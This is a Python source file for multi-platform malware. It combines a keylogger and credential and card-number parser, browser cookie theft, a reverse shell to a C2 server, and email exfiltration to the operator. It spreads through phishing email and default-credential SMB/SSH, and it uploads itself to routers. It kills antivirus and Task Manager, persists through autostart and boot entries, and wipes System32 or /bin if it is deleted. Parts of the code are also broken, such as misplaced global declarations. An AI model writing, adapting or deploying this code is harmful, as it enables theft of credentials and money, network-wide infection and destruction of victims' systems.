import os
import platform
import logging
import smtplib
import psutil
import threading
import winreg
import browsercookie
import re
import email
import imaplib
import scapy.all as scapy
import socket
import shutil
import subprocess
import random
import string
import base64
import ctypes
import sys
import time
import wmi
import requests
import sqlite3
import win32com.client
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

# Email settings (replace with your details)
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"  # Use Gmail app-specific password
TO_EMAIL = "recipient_email@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
IMAP_SERVER = "imap.gmail.com"

# Remote shell settings (replace with your attacker's IP and port)
C2_SERVER = "your_public_ip"  # Your server's public IP
C2_PORT = 4444  # Port for reverse shell
KILL_PORT = 5555  # Port for kill switch

# File settings
LOG_FILE = "keylog.txt"
CRED_FILE = "credentials.txt"
IP_FILE = "network_ips.txt"
CONTACTS_FILE = "contacts.txt"
SCRIPT_NAME = os.path.abspath(__file__)
SELF_DESTRUCT_MESSAGE = "Tried to delete me? System's fucked now."

# Stealth and obfuscation settings
SYSTEM_PROCESS_NAMES = {
    "Windows": "svchost.exe",
    "Linux": "systemd",
    "Darwin": "launchd",
    "iOS": "mobile",
    "Android": "system_server"
}
OBFUSCATED_NAME = ''.join(random.choices(string.ascii_lowercase, k=10)) + ".py"
AES_KEY = hashlib.sha256(b"secret_key_123456").digest()  # 32-byte key for AES

# Network persistence settings
ROUTER_IPS = ["192.168.0.1", "192.168.1.1", "192.168.2.1"]
ROUTER_CREDENTIALS = [("admin", "admin"), ("root", "password"), ("admin", "123456")]

# RSA key pair for kill switch authentication (replace with your own keys)
PRIVATE_KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
PUBLIC_KEY = PRIVATE_KEY.public_key()
PUBLIC_KEY_PEM = PUBLIC_KEY.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKey
).decode()

# Set up logging with specific error handling
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s: %(levelname)s: %(message)s"
)

# Credential, IP, and contact storage
credentials = []
network_ips = []
contacts = []

def encrypt_data(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode()
        ct = base64.b64encode(ct_bytes).decode()
        return f"{iv}:{ct}"
    except Exception as e:
        logging.error(f"Encryption failed: {str(e)}")
        return data

def decrypt_data(data):
    try:
        iv, ct = data.split(":")
        iv = base64.b64decode(iv)
        ct = base64.b64decode(ct)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size).decode()
        return pt
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        return data

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_SERVER, C2_PORT))
        logging.info(f"Connected to C2 server {C2_SERVER}:{C2_PORT}")
        
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                s.close()
                break
            elif command.startswith("upload "):
                _, filename = command.split(" ", 1)
                try:
                    with open(filename, "rb") as f:
                        s.sendall(f.read())
                    s.send(b"[+] File uploaded")
                except Exception as e:
                    s.send(f"[-] Upload failed: {str(e)}".encode())
            elif command.startswith("download "):
                _, filename = command.split(" ", 1)
                try:
                    with open(filename, "wb") as f:
                        data = s.recv(1024 * 1024)  # Max 1MB
                        f.write(data)
                    s.send(b"[+] File downloaded")
                except Exception as e:
                    s.send(f"[-] Download failed: {str(e)}".encode())
            else:
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    s.send(encrypt_data(output).encode())
                except Exception as e:
                    s.send(f"[-] Command failed: {str(e)}".encode())
    except Exception as e:
        logging.error(f"Reverse shell failed: {str(e)}")
        time.sleep(10)
        reverse_shell()

def kill_switch():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", KILL_PORT))
        s.listen(1)
        logging.info(f"Kill switch listening on port {KILL_PORT}")
        
        while True:
            conn, addr = s.accept()
            data = conn.recv(1024)
            try:
                command, signature = data.split(b":")
                PUBLIC_KEY.verify(
                    signature,
                    command,
                    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
                    hashes.SHA256()
                )
                if command.decode() == "KILL":
                    logging.info("Kill switch activated, self-deleting")
                    cleanup()
                    conn.send(b"[+] Malware deactivated")
                    conn.close()
                    os._exit(0)
                else:
                    conn.send(b"[-] Invalid command")
            except Exception as e:
                logging.error(f"Kill switch verification failed: {str(e)}")
                conn.send(f"[-] Verification failed: {str(e)}".encode())
            conn.close()
    except Exception as e:
        logging.error(f"Kill switch failed: {str(e)}")
        time.sleep(10)
        kill_switch()

def cleanup():
    try:
        if platform.system() == "Windows":
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "SystemUpdater")
                winreg.CloseKey(key)
                logging.info("Removed from Windows autostart")
            except:
                pass
            try:
                subprocess.run(["bcdedit", "/deletevalue", "{bootmgr}", "path"], capture_output=True)
                logging.info("Removed from UEFI boot")
            except:
                pass
        elif platform.system() in ["Linux", "Darwin"]:
            try:
                subprocess.run("crontab -r", shell=True, capture_output=True)
                logging.info("Removed from crontab")
            except:
                pass
        for f in [SCRIPT_NAME, LOG_FILE, CRED_FILE, IP_FILE, CONTACTS_FILE, f".{LOG_FILE}", f".{CRED_FILE}", f".{IP_FILE}", f".{CONTACTS_FILE}"]:
            try:
                os.remove(f)
                logging.info(f"Deleted {f}")
            except:
                pass
        for ip in network_ips + ROUTER_IPS:
            try:
                if platform.system() == "Windows":
                    subprocess.run(["net", "use", f"\\\\{ip}\\C$", "/delete"], capture_output=True)
                elif platform.system() in ["Linux", "Darwin"]:
                    for user, pwd in ROUTER_CREDENTIALS:
                        subprocess.run(["sshpass", "-p", pwd, "ssh", f"{user}@{ip}", "rm", f"/usr/local/bin/{SYSTEM_PROCESS_NAMES[platform.system()]}.py"], capture_output=True)
            except:
                pass
    except Exception as e:
        logging.error(f"Cleanup failed: {str(e)}")

def extract_contacts():
    try:
        system = platform.system()
        contact_data = []
        if system == "Windows":
            outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
            contacts_folder = outlook.GetDefaultFolder(10)  # 10 = Contacts folder
            for item in contacts_folder.Items:
                try:
                    name = item.FullName
                    phone = item.MobileTelephoneNumber or item.HomeTelephoneNumber or item.BusinessTelephoneNumber or "No phone"
                    if name and phone != "No phone":
                        contact_data.append(f"{name} | {phone}")
                except:
                    continue
        elif system in ["iOS", "Android"]:
            db_path = "/data/data/com.android.providers.contacts/databases/contacts2.db" if system == "Android" else "/var/mobile/Library/AddressBook/AddressBook.sqlitedb"
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT c.first, c.last, p.value FROM ABPerson c JOIN ABMultiValue p ON c.ROWID = p.record_id WHERE p.property = 3")  # 3 = phone
                for row in cursor.fetchall():
                    name = f"{row[0]} {row[1]}".strip()
                    phone = row[2]
                    if name and phone:
                        contact_data.append(f"{name} | {phone}")
                conn.close()
            except:
                logging.warning(f"Contact database access failed on {system}")
        elif system in ["Linux", "Darwin"]:
            try:
                result = subprocess.run(["contacts", "-f", "%n %p"], capture_output=True, text=True)
                for line in result.stdout.splitlines():
                    if line:
                        contact_data.append(line)
            except:
                logging.warning(f"Contact extraction not supported on {system}")
        
        if contact_data:
            encrypted_data = encrypt_data("\n".join(contact_data))
            with open(CONTACTS_FILE, "a") as f:
                f.write(f"{encrypted_data}\n")
            contacts.extend(contact_data)
            logging.info(f"Extracted {len(contact_data)} contacts")
        return "\n".join(contact_data) or "No contacts found"
    except Exception as e:
        logging.error(f"Contact extraction failed: {str(e)}")
        return "Contact extraction failed"

def uefi_persistence():
    if platform.system() == "Windows":
        try:
            uefi_path = "C:\\Windows\\Boot\\EFI\\systemupdater.py"
            shutil.copy(SCRIPT_NAME, uefi_path)
            subprocess.run(["bcdedit", "/set", "{bootmgr}", "path", uefi_path], capture_output=True)
            logging.info("Added to UEFI boot")
        except Exception as e:
            logging.error(f"UEFI persistence failed: {str(e)}")

def network_persistence():
    try:
        credentials_list = [("admin", "admin"), ("root", "password"), ("user", "123456")]
        for ip in network_ips:
            for user, pwd in credentials_list:
                try:
                    if platform.system() == "Windows":
                        share_path = f"\\\\{ip}\\C$\\ProgramData\\{SYSTEM_PROCESS_NAMES['Windows']}.py"
                        subprocess.run(["net", "use", f"\\\\{ip}\\C$", f"/user:{user}", pwd], capture_output=True)
                        shutil.copy(SCRIPT_NAME, share_path)
                        logging.info(f"Persisted to network share {ip} via SMB")
                        subprocess.run(["net", "use", f"\\\\{ip}\\C$", "/delete"], capture_output=True)
                    elif platform.system() in ["Linux", "Darwin"]:
                        subprocess.run(["sshpass", "-p", pwd, "scp", SCRIPT_NAME, f"{user}@{ip}:/usr/local/bin/{SYSTEM_PROCESS_NAMES[platform.system()]}.py"])
                        logging.info(f"Persisted to network device {ip} via SSH")
                    break
                except Exception as e:
                    logging.error(f"Network persistence failed for {ip} with {user}:{pwd}: {str(e)}")
        
        for router_ip in ROUTER_IPS:
            for user, pwd in ROUTER_CREDENTIALS:
                try:
                    response = requests.get(f"http://{router_ip}/", auth=(user, pwd), timeout=5)
                    if response.status_code == 200:
                        upload_path = f"http://{router_ip}/upload"
                        with open(SCRIPT_NAME, "rb") as f:
                            files = {"file": (f"{SYSTEM_PROCESS_NAMES[platform.system()]}.py", f)}
                            requests.post(upload_path, auth=(user, pwd), files=files, timeout=5)
                        logging.info(f"Persisted to router {router_ip}")
                        break
                except Exception as e:
                    logging.error(f"Router persistence failed for {router_ip} with {user}:{pwd}: {str(e)}")
    except Exception as e:
        logging.error(f"Network persistence failed: {str(e)}")

def get_windows_product_key():
    try:
        if platform.system() == "Windows":
            c = wmi.WMI()
            for os in c.Win32_OperatingSystem():
                product_key = os.ProductKey
                return encrypt_data(product_key) if product_key else "No product key found"
        return "Not a Windows system"
    except Exception as e:
        logging.error(f"Product key retrieval failed: {str(e)}")
        return "Product key retrieval failed"

def obfuscate_script():
    try:
        encrypted_content = encrypt_data(open(SCRIPT_NAME, "r").read())
        with open(OBFUSCATED_NAME, "w") as f:
            f.write(f"""
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib
key = hashlib.sha256(b"secret_key_123456").digest()
iv, ct = "{encrypted_content}".split(":")
iv = base64.b64decode(iv)
ct = base64.b64decode(ct)
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
exec(unpad(cipher.decrypt(ct), AES.block_size).decode())
""")
        os.chmod(OBFUSCATED_NAME, 0o600)
        os.rename(SCRIPT_NAME, OBFUSCATED_NAME)
        global SCRIPT_NAME
        SCRIPT_NAME = os.path.abspath(OBFUSCATED_NAME)
        logging.info(f"Obfuscated to {SCRIPT_NAME}")
    except Exception as e:
        logging.error(f"Obfuscation failed: {str(e)}")

def hide_file():
    try:
        if platform.system() == "Windows":
            subprocess.run(["attrib", "+h", SCRIPT_NAME], capture_output=True)
            subprocess.run(["attrib", "+h", LOG_FILE], capture_output=True)
            subprocess.run(["attrib", "+h", CRED_FILE], capture_output=True)
            subprocess.run(["attrib", "+h", IP_FILE], capture_output=True)
            subprocess.run(["attrib", "+h", CONTACTS_FILE], capture_output=True)
        elif platform.system() in ["Linux", "Darwin", "iOS", "Android"]:
            os.rename(SCRIPT_NAME, f".{os.path.basename(SCRIPT_NAME)}")
            global SCRIPT_NAME
            SCRIPT_NAME = f".{os.path.basename(SCRIPT_NAME)}"
            for f in [LOG_FILE, CRED_FILE, IP_FILE, CONTACTS_FILE]:
                os.rename(f, f".{f}")
                os.chmod(f".{f}", 0o600)
        logging.info("Files hidden")
    except Exception as e:
        logging.error(f"File hiding failed: {str(e)}")

def spoof_process_name():
    try:
        system = platform.system()
        if system == "Windows":
            ctypes.windll.kernel32.SetConsoleTitleW(SYSTEM_PROCESS_NAMES["Windows"])
            logging.info(f"Spoofed process name to {SYSTEM_PROCESS_NAMES['Windows']}")
        elif system in ["Linux", "Darwin", "iOS", "Android"]:
            try:
                libc = ctypes.CDLL(ctypes.util.find_library("c"))
                libc.prctl(15, SYSTEM_PROCESS_NAMES[system], 0, 0, 0)
                logging.info(f"Spoofed process name to {SYSTEM_PROCESS_NAMES[system]}")
            except:
                logging.warning("prctl not available on this platform")
    except Exception as e:
        logging.error(f"Process spoofing failed: {str(e)}")

def anti_debugging():
    try:
        if platform.system() == "Windows":
            if ctypes.windll.kernel32.IsDebuggerPresent():
                logging.warning("Debugger detected, exiting")
                os._exit(1)
        if psutil.cpu_count() < 2 or psutil.disk_usage("/").total < 20 * 1024 * 1024 * 1024:
            logging.warning("Possible VM detected, exiting")
            os._exit(1)
    except Exception as e:
        logging.error(f"Anti-debugging check failed: {str(e)}")

def disable_antivirus():
    av_processes = [
        "McAfee", "Norton", "Avast", "Avira", "Bitdefender", "Defender", "WindowsDefender",
        "eset", "kaspersky", "avg", "sophos", "trendmicro", "malwarebytes"
    ]
    try:
        for proc in psutil.process_iter():
            for av in av_processes:
                if av.lower() in proc.name().lower():
                    try:
                        proc.kill()
                        logging.info(f"Killed antivirus process: {proc.name()}")
                    except Exception as e:
                        logging.error(f"Failed to kill {proc.name()}: {str(e)}")
        if platform.system() == "Windows":
            try:
                subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], capture_output=True)
                logging.info("Disabled Windows Defender")
            except Exception as e:
                logging.error(f"Failed to disable Windows Defender: {str(e)}")
    except Exception as e:
        logging.error(f"Antivirus disable failed: {str(e)}")

def save_credentials(site, email_or_nick, password, card_data=None):
    try:
        data = f"{site} | {email_or_nick} | {password}"
        if card_data:
            data += f" | Card: {card_data}"
        encrypted_data = encrypt_data(data)
        with open(CRED_FILE, "a") as f:
            f.write(f"{encrypted_data}\n")
        credentials.append(data)
    except Exception as e:
        logging.error(f"Credential save failed: {str(e)}")

def parse_credentials(key_data):
    try:
        email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        username_pattern = r"(?<=username[:=]\s*)[\S]{3,}|(?<=login[:=]\s*)[\S]{3,}|(?<=@)[a-zA-Z0-9._]{3,}"
        password_pattern = r"(?<=password[:=]\s*)[\S]{6,}"
        card_pattern = r"(?:\d{4}[- ]){3}\d{4}|\d{16}"
        
        site_keywords = {
            "facebook": "facebook.com",
            "gmail": "mail.google.com",
            "twitter": "x.com",
            "instagram": "instagram.com",
            "netflix": "netflix.com",
            "steam": "steampowered.com",
            "epicgames": "epicgames.com",
            "riot": "riotgames.com",
            "linkedin": "linkedin.com",
            "tiktok": "tiktok.com"
        }
        site = "unknown"
        for key, domain in site_keywords.items():
            if key in key_data.lower():
                site = domain
                break
        
        email_match = re.search(email_pattern, key_data)
        username_match = re.search(username_pattern, key_data, re.IGNORECASE)
        email_or_nick = email_match.group(0) if email_match else (username_match.group(0) if username_match else "unknown_nick")
        
        password_match = re.search(password_pattern, key_data, re.IGNORECASE)
        password = password_match.group(0) if password_match else "unknown_password"
        
        card_match = re.search(card_pattern, key_data)
        card_data = card_match.group(0) if card_match else None
        
        if email_match or username_match or password_match or card_match:
            save_credentials(site, email_or_nick, password, card_data)
    except Exception as e:
        logging.error(f"Credential parsing failed: {str(e)}")

def scan_network():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        subnet = ".".join(local_ip.split(".")[:-1]) + ".0/24"
        
        arp = scapy.ARP(pdst=subnet)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/arp
        result = scapy.srp(packet, timeout=2, verbose=False)[0]
        
        for sent, received in result:
            ip = received.psrc
            save_network_ips(ip)
        logging.info(f"Found IPs: {network_ips}")
    except Exception as e:
        logging.error(f"Network scan failed: {str(e)}")

def save_network_ips(ip):
    try:
        with open(IP_FILE, "a") as f:
            f.write(f"{ip}\n")
        network_ips.append(ip)
    except Exception as e:
        logging.error(f"IP save failed: {str(e)}")

def spread_to_network():
    credentials_list = [("admin", "admin"), ("root", "password"), ("user", "123456")]
    for ip in network_ips:
        for user, pwd in credentials_list:
            try:
                if platform.system() == "Windows":
                    share_path = f"\\\\{ip}\\C$\\ProgramData\\{SYSTEM_PROCESS_NAMES['Windows']}.py"
                    subprocess.run(["net", "use", f"\\\\{ip}\\C$", f"/user:{user}", pwd], capture_output=True)
                    shutil.copy(SCRIPT_NAME, share_path)
                    logging.info(f"Spread to {ip} via SMB")
                    subprocess.run(["net", "use", f"\\\\{ip}\\C$", "/delete"], capture_output=True)
                elif platform.system() in ["Linux", "Darwin"]:
                    subprocess.run(["sshpass", "-p", pwd, "scp", SCRIPT_NAME, f"{user}@{ip}:/usr/local/bin/{SYSTEM_PROCESS_NAMES[platform.system()]}.py"])
                    logging.info(f"Spread to {ip} via SSH")
                break
            except Exception as e:
                logging.error(f"Failed to spread to {ip} with {user}:{pwd}: {str(e)}")

def get_email_contacts():
    try:
        imap = imaplib.IMAP4_SSL(IMAP_SERVER)
        imap.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        imap.select("INBOX")
        _, data = imap.search(None, "ALL")
        contacts = set()
        for num in data[0].split()[:50]:
            _, msg_data = imap.fetch(num, "(RFC822)")
            msg = email.message_from_bytes(msg_data[0][1])
            from_addr = msg["from"]
            if from_addr and "@" in from_addr:
                contacts.add(from_addr.split("<")[-1].split(">")[0].strip())
        imap.logout()
        return list(contacts)
    except Exception as e:
        logging.error(f"Failed to get contacts: {str(e)}")
        return []

def send_email(subject, body, attachments=None, to_addr=None):
    try:
        msg = MIMEMultipart()
        msg["Subject"] = subject
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = to_addr if to_addr else TO_EMAIL
        msg.attach(MIMEText(body))
        
        if attachments:
            for file_path in attachments:
                part = MIMEBase("application", "octet-stream")
                with open(file_path, "rb") as f:
                    part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(file_path)}"
                )
                msg.attach(part)
        
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, msg["To"], msg.as_string())
        logging.info(f"Email sent to {msg['To']}")
    except Exception as e:
        logging.error(f"Email failed to {msg['To']}: {str(e)}")

def spread_script():
    contacts = get_email_contacts()
    if contacts:
        for contact in contacts:
            send_email(
                subject="Critical System Update",
                body="Please run this system update script immediately for security.",
                attachments=[SCRIPT_NAME],
                to_addr=contact
            )

def read_log_file():
    try:
        with open(LOG_FILE, "r") as f:
            return f.read()
    except Exception as e:
        logging.error(f"Log read failed: {str(e)}")
        return "No log data yet."

def read_credentials_file():
    try:
        with open(CRED_FILE, "r") as f:
            decrypted_lines = []
            for line in f:
                decrypted = decrypt_data(line.strip())
                decrypted_lines.append(decrypted)
            return "\n".join(decrypted_lines)
    except Exception as e:
        logging.error(f"Credentials read failed: {str(e)}")
        return "No credentials yet."

def read_ip_file():
    try:
        with open(IP_FILE, "r") as f:
            return f.read()
    except Exception as e:
        logging.error(f"IP read failed: {str(e)}")
        return "No IP data yet."

def read_contacts_file():
    try:
        with open(CONTACTS_FILE, "r") as f:
            decrypted_lines = []
            for line in f:
                decrypted = decrypt_data(line.strip())
                decrypted_lines.append(decrypted)
            return "\n".join(decrypted_lines)
    except Exception as e:
        logging.error(f"Contacts read failed: {str(e)}")
        return "No contacts yet."

def steal_browser_passwords():
    try:
        cookies = browsercookie.chrome()
        cookie_data = str(cookies)
        return encrypt_data(cookie_data) if cookie_data else "No browser cookies found."
    except Exception as e:
        logging.error(f"Browser password steal failed: {str(e)}")
        return "No browser cookies found."

def get_windows_product_key():
    try:
        if platform.system() == "Windows":
            c = wmi.WMI()
            for os in c.Win32_OperatingSystem():
                product_key = os.ProductKey
                return encrypt_data(product_key) if product_key else "No product key found"
        return "Not a Windows system"
    except Exception as e:
        logging.error(f"Product key retrieval failed: {str(e)}")
        return "Product key retrieval failed"

def add_to_autostart():
    try:
        system = platform.system()
        if system == "Windows":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, f'"{SCRIPT_NAME}"')
            winreg.CloseKey(key)
            logging.info("Added to Windows autostart")
        elif system in ["Linux", "Darwin"]:
            cron_job = f"@reboot python3 {SCRIPT_NAME}"
            subprocess.run(f'(crontab -l ; echo "{cron_job}") | crontab -', shell=True, capture_output=True)
            logging.info(f"Added to {system} crontab")
        elif system in ["iOS", "Android"]:
            logging.warning(f"Autostart not implemented for {system} due to sandboxing")
    except Exception as e:
        logging.error(f"Autostart failed: {str(e)}")

def protect_process():
    while True:
        try:
            for proc in psutil.process_iter():
                if proc.name() == "python" and SCRIPT_NAME in proc.cmdline():
                    continue
                if proc.name() in ["Taskmgr.exe", "taskmgr"]:
                    proc.kill()
                    logging.info(f"Killed Task Manager: {proc.name()}")
            time.sleep(1)
        except Exception as e:
            logging.error(f"Process protection failed: {str(e)}")
            time.sleep(1)

def self_destruct():
    while True:
        try:
            if not os.path.exists(SCRIPT_NAME):
                if platform.system() == "Windows":
                    subprocess.run("del /F /Q C:\\Windows\\System32\\*", shell=True, capture_output=True)
                elif platform.system() in ["Linux", "Darwin"]:
                    subprocess.run("rm -rf /bin /usr/bin", shell=True, capture_output=True)
                send_email("System Nuked", SELF_DESTRUCT_MESSAGE)
                os._exit(1)
            time.sleep(1)
        except Exception as e:
            logging.error(f"Self-destruct failed: {str(e)}")
            time.sleep(1)

def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        logging.info(key_str)
        with open(LOG_FILE, "r") as f:
            parse_credentials(f.read())
    except Exception as e:
        logging.error(f"Keylogging failed: {str(e)}")

def check_shutdown():
    while True:
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            if cpu_usage == 0.0:
                log_data = read_log_file()
                cred_data = read_credentials_file()
                ip_data = read_ip_file()
                contact_data = read_contacts_file()
                password_data = steal_browser_passwords()
                product_key = get_windows_product_key()
                send_email(
                    "System Shutdown - Keylog Data",
                    f"Keys:\n{log_data}\n\nSorted Credentials (site | email/nick | password | card):\n{cred_data}\n\nNetwork IPs:\n{ip_data}\n\nContacts:\n{contact_data}\n\nBrowser Cookies:\n{password_data}\n\nWindows Product Key:\n{product_key}"
                )
                spread_script()
                spread_to_network()
                network_persistence()
                break
            time.sleep(5)
        except Exception as e:
            logging.error(f"Shutdown check failed: {str(e)}")
            time.sleep(5)

# Start threads
threading.Thread(target=reverse_shell, daemon=True).start()
threading.Thread(target=kill_switch, daemon=True).start()
threading.Thread(target=spoof_process_name, daemon=True).start()
threading.Thread(target=obfuscate_script, daemon=True).start()
threading.Thread(target=hide_file, daemon=True).start()
threading.Thread(target=anti_debugging, daemon=True).start()
threading.Thread(target=disable_antivirus, daemon=True).start()
threading.Thread(target=scan_network, daemon=True).start()
threading.Thread(target=protect_process, daemon=True).start()
threading.Thread(target=self_destruct, daemon=True).start()
threading.Thread(target=check_shutdown, daemon=True).start()
threading.Thread(target=network_persistence, daemon=True).start()
threading.Thread(target=extract_contacts, daemon=True).start()
if platform.system() == "Windows":
    threading.Thread(target=uefi_persistence, daemon=True).start()

# Add to autostart
add_to_autostart()

# Start keylogger
with Listener(on_press=on_press) as listener:
    listener.join()